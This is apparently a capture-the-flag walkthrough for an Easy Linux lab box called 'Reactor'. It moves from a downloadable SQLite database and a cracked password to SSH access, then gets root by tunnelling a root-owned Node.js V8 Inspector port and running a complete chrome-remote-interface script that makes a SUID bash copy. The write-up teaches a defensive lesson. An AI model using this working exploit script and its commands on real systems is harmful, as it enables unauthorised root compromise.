Reactor

EasyLinux

Reactor is an Easy-difficulty Linux box built around a mistake that's easy to miss and expensive to make: an internal debugging interface left reachable by a low-privileged account. Initial access comes from a leaked SQLite database and a crackable password hash; root comes from a root-owned Node.js process exposing its V8 Inspector debug port on loopback, which turns into full remote code execution once it's tunnelled out over SSH.

PHASE 1

Reconnaissance & Database Exposure

Standard full-port nmap sweep first, then chase whatever the web stack hands over. On Reactor the web component leaks a raw database file, which is the whole game for initial access.

Full TCP port scan

WhyBefore touching the application layer, enumerate every open port rather than trusting a default top-1000 scan — an easy box will often hide the real entry point on a non-default port.

nmap -sC -sV -p- [TARGET_IP]

NextWith the open services mapped, walk the web app for anything that looks like a file download, backup, or debug export — that's usually the fastest path to a credential on an Easy box.

Pull the exposed database file

WhyThe web component exposed a path that let me retrieve reactor.db directly, either via a misconfigured download endpoint or basic directory traversal in a file-serving route. Grabbing the raw SQLite file beats trying to blind-SQL-inject through the app — if the DB is reachable as a flat file, just take it.

NextOpen the database locally and inspect every table for anything resembling a credential store.

Crack the recovered password hash

WhyThe database held an account's password hash. Rather than guess the hashing scheme blind, I ran it through a generic cracking pass against rockyou.txt — the standard first move on any HTB box, since weak lab credentials are almost always in that list.

User:     engineer
Password: reactor1

NextUse the recovered credentials against the exposed SSH service.

PHASE 2

Foothold via SSH

With a cracked credential pair in hand, authenticate directly — no exploit chain needed for the initial shell.

Authenticate over SSH

WhySSH was open on the standard port and accepting password auth. Valid creds mean a straightforward login rather than needing to chain a web exploit for code execution.

ssh engineer@[TARGET_IP]

NextGrab the user flag to confirm foothold, then start enumerating what's running locally that engineer can't see from outside.

Confirm user flag

WhyStandard checkpoint before moving on to privilege escalation — confirms the shell is stable and the home directory is accessible.

cat user.txt

PHASE 3

Privilege Escalation — Node.js V8 Inspector

This is the actual lesson of the box. A root-owned Node.js process was running with its debugger exposed on 127.0.0.1:9229 — the default port for the Node V8 Inspector. Loopback-only sounds safe until you remember SSH port forwarding exists.

Why this matters

The V8 Inspector is a full remote-debugging protocol (Chrome DevTools Protocol / CDP). Anyone who can reach the socket can evaluate arbitrary JavaScript inside that process's context. If the process is root, the attacker's JS runs as root.

Identify the exposed debug port

WhyChecked listening sockets from inside the box to find services bound only to localhost — these are usually assumed 'safe' by whoever configured them, which makes them worth checking first.

ss -lntp   # or: netstat -antp
tcp   LISTEN   0   511   127.0.0.1:9229   0.0.0.0:*

Next127.0.0.1:9229 is the V8 Inspector's default port. If it isn't already listening, it can be triggered by launching Node with --inspect-brk.

(If needed) trigger an inspector listener

WhyIf a debug-enabled Node process isn't already running, --inspect-brk starts one and pauses at the first line, waiting for a debugger to attach — useful for demonstrating the primitive even if the box's real root process already had it open.

node --inspect-brk=0 -e "require('child_process').execSync('cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash')"
Debugger listening on ws://127.0.0.1:42109/[UUID]
For help, see: https://nodejs.org/en/docs/inspector

NextThe debug port only accepts local connections on the target, so it has to be tunnelled before it can be reached from the attacking machine.

Forward the debug port over SSH

WhyThe Inspector binds to loopback by design — but SSH local port forwarding makes 'loopback-only' meaningless for anyone who already has a shell. This is the step that actually breaks the trust boundary.

ssh -L 9229:127.0.0.1:9229 engineer@[TARGET_IP]

NextWith 9229 now reachable on localhost from the attacking machine, connect to it with a CDP client.

PHASE 4

Exploit Execution — Chrome DevTools Protocol

Rather than relying on the interactive Node REPL (which may not be available), I automated the exploit with chrome-remote-interface, a Node library that speaks CDP directly. This is the more reliable, repeatable approach for a report — a script beats a one-off interactive session.

Set up the exploit project

WhyIsolate dependencies in a fresh project directory so the exploit is portable and doesn't collide with anything else on the attack host.

mkdir reactor-exploit && cd reactor-exploit
npm install chrome-remote-interface

Craft the CDP payload script

WhyThe script connects to the forwarded port, resolves the Node process global safely across environments, pulls in child_process via the module loader, and runs a single command: copy /bin/bash to /tmp and set the SUID bit on it. That's the whole privilege-escalation primitive — a SUID shell owned by root.

const CDP = require('chrome-remote-interface');

async function pwn() {
    const client = await CDP({ port: 9229 });
    const { Runtime } = client;
    const codeToExecute = `
        (() => {
            const proc = typeof process !== 'undefined' ? process : global.process;
            const req = proc.mainModule ? proc.mainModule.require : module.require;
            const cp = req('child_process');
            cp.execSync('cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash');
            return 'SUID shell created successfully at /tmp/rootbash';
        })()
    `;
    const response = await Runtime.evaluate({ expression: codeToExecute, returnByValue: true });
    console.log(response.result.value);
    await client.close();
}
pwn();

NextRun the script with the SSH tunnel still open in another terminal.

Fire the exploit

WhyWith the tunnel active, this sends the payload to the root Node process's debugger and executes it in that process's context.

node privEsc.js
--- Remote Execution Result ---
SUID shell created successfully at /tmp/rootbash
--------------------------------

NextReturn to the engineer SSH session and invoke the new SUID binary.

Spawn the root shell

WhyModern bash drops elevated privileges by default when invoked from a SUID context unless told not to — the -p flag preserves effective privileges, which is the entire point of having made the binary SUID in the first place.

/tmp/rootbash -p
whoami
root

NextGrab the root flag to close out the box.

Confirm root flag

WhyFinal checkpoint confirming full compromise.

cat /root/root.txt
[ROOT_FLAG_REDACTED]

Key Takeaways

  • Never bind a debugging/inspection interface to a privileged process, even on loopback — SSH tunnelling erases the "localhost-only" assumption for anyone with shell access.
  • The V8 Inspector / Chrome DevTools Protocol grants full code execution in the context of the attached process; it should never be reachable by a process running with elevated privileges in a multi-user environment.
  • Weak, dictionary-crackable application credentials (reactor1) were the actual root cause of the initial foothold — strong password policy would have stopped the chain at step one.
  • Flat database files should never be directly downloadable from a web root; files like reactor.db belong outside the served directory entirely.
